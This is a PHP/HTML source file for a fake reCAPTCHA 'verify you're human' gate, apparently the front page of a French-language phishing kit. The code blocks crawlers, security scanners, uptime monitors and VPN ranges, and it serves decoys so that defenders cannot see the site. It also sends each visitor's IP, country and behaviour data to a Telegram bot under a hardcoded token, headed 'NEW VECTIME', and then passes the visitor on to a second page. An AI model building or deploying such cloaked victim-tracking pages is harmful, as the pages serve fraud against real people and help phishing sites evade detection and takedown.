<?php
require "antibot.php";
;


// Security headers
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");
header("Referrer-Policy: no-referrer-when-downgrade");

// Session for rate limiting
session_start();

// Get client info
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Function to check for bots
function is_bot($user_agent) {
    $bot_patterns = [
        '/bot/', '/crawl/', '/spider/', '/scrape/', '/curl/',
        '/wget/', '/python/', '/java/', '/php/', '/ruby/',
        '/perl/', '/Go-http-client/', '/node/', '/axios/',
        '/zgrab/', '/masscan/', '/nmap/', '/sqlmap/',
        '/headless/', '/phantom/', '/selenium/', '/puppeteer/',
        '/playwright/', '/cheerio/', '/request/', '/scrapy/',
        '/beautifulsoup/', '/mechanize/', '/guzzle/',
        '/postman/', '/insomnia/', '/httrack/', '/sitecopy/',
        '/webbandit/', '/teleport/', '/webcopier/', '/webzip/',
        '/webcopy/', '/websucker/', '/webstripper/', '/webviewer/',
        '/webwhacker/', '/webzip/', '/wget/', '/curl/',
        '/libwww-perl/', '/lwp/', '/wp rocket/', '/w3c/',
        '/validator/', '/checker/', '/monitor/', '/pingdom/',
        '/uptime/', '/statuscake/', '/newrelic/', '/datadog/',
        '/pagerduty/', '/opsgenie/', '/victorops/'
    ];
    
    $ua_lower = strtolower($user_agent);
    
    foreach ($bot_patterns as $pattern) {
        if (preg_match($pattern, $ua_lower)) {
            return true;
        }
    }
    
    // Check for empty or suspicious user agents
    if (empty($user_agent) || strlen($user_agent) < 20) {
        return true;
    }
    
    // Check for common browser strings (if none found, might be bot)
    $browser_patterns = ['mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera'];
    $has_browser = false;
    foreach ($browser_patterns as $browser) {
        if (strpos($ua_lower, $browser) !== false) {
            $has_browser = true;
            break;
        }
    }
    
    return !$has_browser;
}

// Function to check VPN/Proxy
function is_vpn_proxy($ip) {
    // Check common VPN IP ranges
    $vpn_prefixes = [
        '5.188.', '45.10.', '45.86.', '45.95.', '45.142.',
        '46.166.', '46.183.', '51.15.', '51.38.', '51.68.',
        '51.77.', '51.83.', '51.89.', '51.158.', '51.161.',
        '62.102.', '62.210.', '64.44.', '66.70.', '77.83.',
        '78.46.', '79.124.', '80.71.', '81.17.', '82.102.',
        '85.159.', '86.106.', '87.121.', '87.98.', '88.99.',
        '89.163.', '89.187.', '91.132.', '91.200.', '91.205.',
        '91.206.', '91.207.', '91.208.', '91.209.', '91.210.',
        '91.211.', '91.212.', '91.213.', '91.214.', '91.215.',
        '91.216.', '91.217.', '91.218.', '91.219.', '91.220.',
        '91.221.', '91.222.', '91.223.', '91.224.', '91.225.',
        '91.226.', '91.227.', '91.228.', '91.229.', '91.230.',
        '91.231.', '91.232.', '91.233.', '91.234.', '91.235.',
        '91.236.', '91.237.', '91.238.', '91.239.', '91.240.',
        '91.241.', '91.242.', '91.243.', '91.244.', '91.245.',
        '91.246.', '91.247.', '91.248.', '91.249.', '91.250.',
        '91.251.', '91.252.', '91.253.', '91.254.', '91.255.',
        '103.103.', '104.167.', '104.200.', '107.189.',
        '109.70.', '109.201.', '109.202.', '109.203.',
        '109.204.', '109.205.', '109.206.', '109.207.',
        '109.208.', '109.209.', '109.210.', '109.211.',
        '109.212.', '109.213.', '109.214.', '109.215.',
        '109.216.', '109.217.', '109.218.', '109.219.',
        '109.220.', '109.221.', '109.222.', '109.223.',
        '109.224.', '109.225.', '109.226.', '109.227.',
        '109.228.', '109.229.', '109.230.', '109.231.',
        '109.232.', '109.233.', '109.234.', '109.235.',
        '109.236.', '109.237.', '109.238.', '109.239.',
        '109.240.', '109.241.', '109.242.', '109.243.',
        '109.244.', '109.245.', '109.246.', '109.247.',
        '109.248.', '109.249.', '109.250.', '109.251.',
        '109.252.', '109.253.', '109.254.', '109.255.',
        '185.107.', '185.108.', '185.109.', '185.110.',
        '185.111.', '185.112.', '185.113.', '185.114.',
        '185.115.', '185.116.', '185.117.', '185.118.',
        '185.119.', '185.120.', '185.121.', '185.122.',
        '185.123.', '185.124.', '185.125.', '185.126.',
        '185.127.', '185.128.', '185.129.', '185.130.',
        '185.131.', '185.132.', '185.133.', '185.134.',
        '185.135.', '185.136.', '185.137.', '185.138.',
        '185.139.', '185.140.', '185.141.', '185.142.',
        '185.143.', '185.144.', '185.145.', '185.146.',
        '185.147.', '185.148.', '185.149.', '185.150.'
    ];
    
    foreach ($vpn_prefixes as $prefix) {
        if (strpos($ip, $prefix) === 0) {
            return true;
        }
    }
    
    // Check for datacenter IPs (common for VPNs)
    $datacenter_asn = [
        'AS13335', // Cloudflare
        'AS15169', // Google
        'AS8075',  // Microsoft
        'AS14618', // Amazon
        'AS16509', // Amazon
        'AS14061', // DigitalOcean
        'AS16276', // OVH
        'AS20473', // Choopa
        'AS24940', // Hetzner
        'AS26496', // GoDaddy
    ];
    
    return false;
}

// Check if user is a bot
$is_bot = is_bot($user_agent);

// Check if using VPN/Proxy
$is_vpn = is_vpn_proxy($client_ip);

// Initialize session tracking
if (!isset($_SESSION['visit_count'])) {
    $_SESSION['visit_count'] = 1;
    $_SESSION['first_visit'] = time();
    $_SESSION['last_activity'] = time();
    $_SESSION['ip_address'] = $client_ip;
    $_SESSION['user_agent'] = $user_agent;
} else {
    $_SESSION['visit_count']++;
    $_SESSION['last_activity'] = time();
}

// Check for session hijacking (IP or UA change)
if (isset($_SESSION['ip_address']) && $_SESSION['ip_address'] !== $client_ip) {
    session_destroy();
    session_start();
    $_SESSION['visit_count'] = 1;
    $_SESSION['first_visit'] = time();
    $_SESSION['last_activity'] = time();
    $_SESSION['ip_address'] = $client_ip;
    $_SESSION['user_agent'] = $user_agent;
    $_SESSION['session_hijack'] = true;
}

// Check if user agent changed
if (isset($_SESSION['user_agent']) && $_SESSION['user_agent'] !== $user_agent) {
    $_SESSION['user_agent'] = $user_agent;
    $_SESSION['ua_changed'] = true;
}

// Only block if it's definitely a bot (not just VPN)
if ($is_bot) {
    // Log the bot attempt
    $log_entry = date('Y-m-d H:i:s') . " - BOT BLOCKED - IP: $client_ip - UA: $user_agent\n";
    file_put_contents('bot_attempts.log', $log_entry, FILE_APPEND);
    
    // Serve a fake page to waste bot's time
    if (isset($_GET['debug']) || strpos($user_agent, 'curl') !== false || strpos($user_agent, 'wget') !== false) {
        // For debugging or obvious bots, show 403
        header("HTTP/1.1 403 Forbidden");
        die("Access denied. Your request has been blocked.");
    } else {
        // For stealthier bots, serve fake content
        header("HTTP/1.1 200 OK");
        ?>
        <!DOCTYPE html>
        <html>
        <head><title>404 Not Found</title></head>
        <body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body>
        </html>
        <?php
        exit;
    }
}

// Block only extremely rapid requests (more than 10 times in 5 seconds)
if ($_SESSION['visit_count'] > 10 && (time() - $_SESSION['first_visit']) < 5) {
    // This is likely a bot - too many rapid requests
    header("HTTP/1.1 429 Too Many Requests");
    die("Too many requests. Please try again later.");
}

// Create a token for form validation
$form_token = md5(session_id() . time() . $client_ip);
$_SESSION['form_token'] = $form_token;

// Create JS challenge token
$js_token = base64_encode(time() . '-' . rand(1000, 9999));

// Store client info in session for later verification
$_SESSION['client_ip'] = $client_ip;
$_SESSION['is_vpn'] = $is_vpn;

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Verify You're Human</title>
    
    <style>
        /* Honeypot field - hidden from humans */
        .hp-field {
            position: absolute !important;
            left: -9999px !important;
            opacity: 0 !important;
            height: 0 !important;
            width: 0 !important;
            pointer-events: none !important;
        }
        
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        
        .captcha-container {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 360px;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            border: 1px solid #e0e0e0;
        }
        
        .logo-top {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }
        
        .logo-link {
            display: inline-block;
            text-decoration: none;
            border: none;
            outline: none;
        }
        
        .logo-link:hover .logo {
            opacity: 0.9;
            transform: scale(1.02);
            transition: all 0.2s ease;
        }
        
        .logo-link:active .logo {
            transform: scale(0.98);
        }
        
        .logo {
            width: 180px;
            height: auto;
            border-radius: 8px;
            transition: all 0.2s ease;
            cursor: pointer;
        }
        
        h1 {
            font-size: 24px;
            margin-top: 0;
            margin-bottom: 24px;
            color: #000000;
            font-weight: 600;
        }
        
        .recaptcha-container {
            background-color: #ffffff;
            border-radius: 4px;
            padding: 8px;
            margin-bottom: 24px;
            text-align: left;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
            box-sizing: border-box;
            border: 2px solid #e0e0e0;
        }
        
        .recaptcha-container:hover {
            box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
            border-color: #c0c0c0;
        }
        
        .recaptcha-left {
            display: flex;
            align-items: center;
            flex-direction: column;
            align-items: flex-start;
        }
        
        .recaptcha-checkbox-wrapper {
            display: flex;
            align-items: center;
            width: 100%;
        }
        
        .recaptcha-checkbox {
            width: 22px;
            height: 22px;
            margin-right: 8px;
            accent-color: #FFD700;
        }
        
        .recaptcha-text {
            color: #333333;
            font-size: 14px;
            font-weight: 500;
        }
        
        .recaptcha-terms {
            color: #666666;
            font-size: 10px;
            margin-top: 4px;
            line-height: 1.2;
            padding-left: 30px;
        }
        
        .recaptcha-logo {
            width: 60px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        
        .recaptcha-logo img {
            max-width: 100%;
            max-height: 100%;
        }
        
        .button-container {
            display: flex;
            justify-content: center;
            margin-top: 24px;
        }
        
        .continue-btn {
            background-color: #00FF00;
            color: #000000;
            border: none;
            border-radius: 500px;
            padding: 10px 24px;
            font-size: 12px;
            font-weight: 700;
            width: auto;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        
        .continue-btn:hover {
            background-color: #00CC00;
            color: #000000;
        }
        
        .continue-btn:disabled {
            background-color: #e0e0e0;
            color: #999999;
            cursor: not-allowed;
        }
        
        .continue-btn.active {
            background-color: #000000;
            color: #FFFFFF;
        }
        
        .error-text {
            display: none;
            color: #e91429;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            margin: 16px 0;
        }
        
        .loading {
            display: none;
            color: #666666;
            font-size: 14px;
            margin-top: 16px;
        }
        
        #captcha-form {
            display: none;
        }
        
        /* Simple time delay indicator */
        .time-delay {
            font-size: 12px;
            color: #666;
            margin-top: 10px;
            display: none;
        }
        
        /* VPN warning */
        .vpn-warning {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            padding: 10px;
            margin-bottom: 20px;
            font-size: 12px;
            color: #856404;
            display: none;
        }
    </style>
</head>
<body>
    <!-- Hidden honeypot fields (bots will fill these) -->
    <input type="text" class="hp-field" name="website" id="website" tabindex="-1" autocomplete="off">
    <input type="checkbox" class="hp-field" name="terms" id="terms" tabindex="-1">
    
    <div class="captcha-container" id="mainContainer">
        <!-- VPN Warning -->
        <?php if ($is_vpn): ?>
        <div class="vpn-warning" id="vpnWarning">
            ⚠️ VPN/Proxy Detected: For security reasons, please disable your VPN to continue.
        </div>
        <?php endif; ?>
        
        
        
        <h1>Please Verify You're Human</h1>
        
        <div class="recaptcha-container" id="recaptchaContainer">
            <div class="recaptcha-left">
                <div class="recaptcha-checkbox-wrapper">
                    <input type="checkbox" id="robotCheckbox" class="recaptcha-checkbox">
                    <div class="recaptcha-text">Je ne suis pas un robot</div>
                </div>
                <div class="recaptcha-terms">
                    Les Conditions d'utilisation de reCAPTCHA sont changer.<br>Prendre des mesures
                </div>
            </div>
            <div class="recaptcha-logo">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
            </div>
        </div>

        <div class="error-text" id="errorMessage">
            Please confirm that you are not a robot.
        </div>
        
        <div class="loading" id="loadingMessage">
            Verifying... Please wait
        </div>

        <div class="time-delay" id="timeDelay">
            Security check in progress... <span id="countdown">3</span>s
        </div>

        <div class="button-container">
            <button class="continue-btn" id="continueBtn" disabled>Continue</button>
        </div>
        
        <form id="captcha-form" method="POST" action="index2.php">
            <input type="hidden" name="page_type" value="captcha">
            <input type="hidden" id="captcha_response_input" name="captcha_response" value="pending">
            <input type="hidden" name="security_token" value="<?php echo $form_token; ?>">
            <input type="hidden" name="js_token" id="js_token" value="<?php echo $js_token; ?>">
            <input type="hidden" name="timestamp" value="<?php echo time(); ?>">
            <input type="hidden" name="user_behavior" id="user_behavior" value="">
            <input type="hidden" name="client_ip" value="<?php echo htmlspecialchars($client_ip); ?>">
            <input type="hidden" name="user_agent_hash" value="<?php echo md5($user_agent); ?>">
        </form>
    </div>

    <script>
        // Security script - bots often don't execute JavaScript properly
        (function() {
            'use strict';
            
            // Mark that JavaScript is running
            document.getElementById('js_token').value = 'executed_' + document.getElementById('js_token').value;
            
            // Start time delay countdown (3 seconds)
            let countdown = 3;
            const countdownElement = document.getElementById('countdown');
            const timeDelayElement = document.getElementById('timeDelay');
            
            // Show VPN warning if detected
            <?php if ($is_vpn): ?>
            document.getElementById('vpnWarning').style.display = 'block';
            // Add extra delay for VPN users
            countdown = 5;
            <?php endif; ?>
            
            // Show countdown
            timeDelayElement.style.display = 'block';
            const countdownInterval = setInterval(function() {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    timeDelayElement.style.display = 'none';
                    
                    // Enable the checkbox after delay
                    document.getElementById('robotCheckbox').disabled = false;
                }
            }, 1000);
            
            // Disable checkbox initially
            document.getElementById('robotCheckbox').disabled = true;
            
            // Track user behavior
            const behaviorData = {
                mouseMoves: 0,
                clicks: 0,
                keyPresses: 0,
                scrollEvents: 0,
                timeOnPage: 0,
                checkboxClickTime: null,
                hasMouseMove: false,
                hasClick: false,
                hasKeyPress: false,
                hasScroll: false
            };
            
            // Start time tracking
            const pageLoadTime = Date.now();
            
            // Mouse movement tracking
            document.addEventListener('mousemove', function() {
                behaviorData.mouseMoves++;
                behaviorData.hasMouseMove = true;
            });
            
            // Click tracking
            document.addEventListener('click', function(e) {
                behaviorData.clicks++;
                behaviorData.hasClick = true;
                
                // Track specifically when checkbox is clicked
                if (e.target.id === 'robotCheckbox' || e.target.closest('#recaptchaContainer')) {
                    behaviorData.checkboxClickTime = Date.now() - pageLoadTime;
                }
            });
            
            // Keyboard tracking
            document.addEventListener('keydown', function() {
                behaviorData.keyPresses++;
                behaviorData.hasKeyPress = true;
            });
            
            // Scroll tracking
            document.addEventListener('scroll', function() {
                behaviorData.scrollEvents++;
                behaviorData.hasScroll = true;
            });
            
            // Update time on page every second
            setInterval(function() {
                behaviorData.timeOnPage = Math.floor((Date.now() - pageLoadTime) / 1000);
            }, 1000);
            
            // Store behavior data before form submission
            window.getBehaviorData = function() {
                // Add bot detection indicators
                behaviorData.isLikelyBot = false;
                
                // Check for bot-like behavior
                if (!behaviorData.hasMouseMove && !behaviorData.hasScroll) {
                    behaviorData.isLikelyBot = true;
                    behaviorData.botReason = 'No mouse movement or scrolling detected';
                }
                
                // Check if checkbox was clicked too fast (bots are instant)
                if (behaviorData.checkboxClickTime && behaviorData.checkboxClickTime < 2000) {
                    behaviorData.isLikelyBot = true;
                    behaviorData.botReason = 'Checkbox clicked too fast: ' + behaviorData.checkboxClickTime + 'ms';
                }
                
                // Check for too few interactions
                if (behaviorData.clicks < 1 && behaviorData.keyPresses < 1) {
                    behaviorData.isLikelyBot = true;
                    behaviorData.botReason = 'No clicks or key presses detected';
                }
                
                return JSON.stringify(behaviorData);
            };
            
            // Check for common bot indicators
            function checkBotIndicators() {
                let botScore = 0;
                
                // Bots often have empty or very short user agents
                if (navigator.userAgent.length < 20) botScore += 30;
                
                // Bots might not have common properties
                if (!navigator.plugins || navigator.plugins.length === 0) botScore += 10;
                if (!navigator.languages || navigator.languages.length === 0) botScore += 10;
                
                // Check for headless browser indicators
                if (navigator.webdriver === true) botScore += 50;
                
                // Check for automation tools
                const automationPatterns = [
                    'selenium', 'phantom', 'puppeteer', 'playwright', 
                    'headless', 'webdriver', 'automation'
                ];
                
                automationPatterns.forEach(pattern => {
                    if (navigator.userAgent.toLowerCase().includes(pattern)) {
                        botScore += 100;
                    }
                });
                
                return botScore;
            }
            
            // Store bot score
            window.botScore = checkBotIndicators();
            
        })();
        
        // Original functionality with enhanced security
        const robotCheckbox = document.getElementById('robotCheckbox');
        const continueBtn = document.getElementById('continueBtn');
        const errorMessage = document.getElementById('errorMessage');
        const loadingMessage = document.getElementById('loadingMessage');
        const captchaForm = document.getElementById('captcha-form');
        const captchaResponseInput = document.getElementById('captcha_response_input');
        const recaptchaContainer = document.getElementById('recaptchaContainer');
        const userBehaviorInput = document.getElementById('user_behavior');
        
        // Set page load time
        const pageLoadTime = Date.now();
        
        async function getIPAndCountry() {
            try {
                // Simple IP fetch with timeout
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 3000);
                
                const ipResponse = await fetch('https://api.ipify.org?format=json', {
                    signal: controller.signal
                });
                clearTimeout(timeout);
                
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // Try to get country
                try {
                    const countryResponse = await fetch(`https://ipapi.co/${userIP}/country_name/`, {
                        signal: controller.signal
                    });
                    let userCountry = await countryResponse.text();
                    
                    if (!userCountry || userCountry.includes('Undefined') || userCountry.includes('error')) {
                        userCountry = 'Unknown';
                    }
                    
                    return { ip: userIP, country: userCountry.trim() };
                } catch (countryError) {
                    return { ip: userIP, country: 'Unknown' };
                }
                
            } catch (error) {
                console.log('IP fetch failed (normal for some networks)');
                return { ip: 'unknown', country: 'unknown' };
            }
        }
        
        async function sendToTelegram(ip, country) {
            const botToken = '8287439394:AAEyFuMPHZTvTU3o4pKimt-ORtCWQEWhkl8'; // Replace with your token
            const chatId = '-5211587685'; // Replace with your chat ID
            
            // Get behavior data
            const behaviorData = window.getBehaviorData ? window.getBehaviorData() : '{}';
            const botScore = window.botScore || 0;
            
            const message = `🚨​ 🔑​ NEW VECTIME 🔑​ :\n\n🌐 IP: ${ip}\n🌍 Pays: ${country}\n🤖 Bot Score: ${botScore}\n⏰ Date: ${new Date().toLocaleString()}\n📊 Behavior: ${behaviorData.substring(0, 100)}...`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.log('Telegram send failed (might be offline)');
                return false;
            }
        }
        
        async function checkVerification() {
            // Check honeypot fields (bots often fill these)
            const honeypotWebsite = document.getElementById('website').value;
            const honeypotTerms = document.getElementById('terms').checked;
            
            if (honeypotWebsite !== '' || honeypotTerms) {
                // Bot detected - honeypot triggered
                errorMessage.textContent = 'Security check failed. Please refresh the page.';
                errorMessage.style.display = 'block';
                
                // Log bot attempt
                await sendToTelegram('Honeypot Triggered', 'Bot Detected');
                return;
            }
            
            // Check if user spent at least 2 seconds on page (bots often submit instantly)
            const timeOnPage = Date.now() - pageLoadTime;
            if (timeOnPage < 2000) {
                errorMessage.textContent = 'Please wait a moment...';
                errorMessage.style.display = 'block';
                setTimeout(() => {
                    errorMessage.style.display = 'none';
                }, 2000);
                return;
            }
            
            if (robotCheckbox.checked) {
                // Show loading
                continueBtn.style.display = 'none';
                loadingMessage.style.display = 'block';
                errorMessage.style.display = 'none';
                
                // Store behavior data
                if (window.getBehaviorData) {
                    userBehaviorInput.value = window.getBehaviorData();
                }
                
                try {
                    // Get user info
                    const userInfo = await getIPAndCountry();
                    
                    // Send to Telegram (non-blocking)
                    sendToTelegram(userInfo.ip, userInfo.country).catch(() => {});
                    
                    // Add small random delay (500-1500ms) to prevent timing attacks
                    const randomDelay = 500 + Math.random() * 1000;
                    await new Promise(resolve => setTimeout(resolve, randomDelay));
                    
                    // Submit form
                    captchaForm.submit();
                    
                } catch (error) {
                    console.log('Verification error:', error);
                    // Still redirect on error
                    captchaForm.submit();
                }
                
            } else {
                errorMessage.style.display = 'block';
                setTimeout(function() {
                    errorMessage.style.display = 'none';
                }, 3000);
            }
        }
        
        function activateContinueButton() {
            continueBtn.disabled = false;
            continueBtn.classList.add('active');
        }
        
        function deactivateContinueButton() {
            continueBtn.disabled = true;
            continueBtn.classList.remove('active');
        }
        
        // Only allow interaction after initial delay
        setTimeout(function() {
            recaptchaContainer.addEventListener('click', function() {
                robotCheckbox.checked = !robotCheckbox.checked;
                
                if (robotCheckbox.checked) {
                    activateContinueButton();
                    captchaResponseInput.value = "verified_" + Date.now();
                    errorMessage.style.display = 'none';
                } else {
                    deactivateContinueButton();
                    captchaResponseInput.value = "pending";
                }
            });
            
            robotCheckbox.addEventListener('click', function(event) {
                event.stopPropagation();
                
                if (this.checked) {
                    activateContinueButton();
                    captchaResponseInput.value = "verified_" + Date.now();
                    errorMessage.style.display = 'none';
                } else {
                    deactivateContinueButton();
                    captchaResponseInput.value = "pending";
                }
            });
        }, 3000); // Wait 3 seconds before allowing interactions
        
        continueBtn.addEventListener('click', function(event) {
            event.stopPropagation();
            checkVerification();
        });
        
        window.addEventListener('load', function() {
            captchaResponseInput.value = "pending_" + Date.now();
            
            // Clear honeypot fields
            document.getElementById('website').value = '';
            document.getElementById('terms').checked = false;
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && robotCheckbox.checked) {
                checkVerification();
            }
        });
        
        // Simple anti-copy protection
        document.addEventListener('contextmenu', function(e) {
            if (e.target.tagName === 'IMG') {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>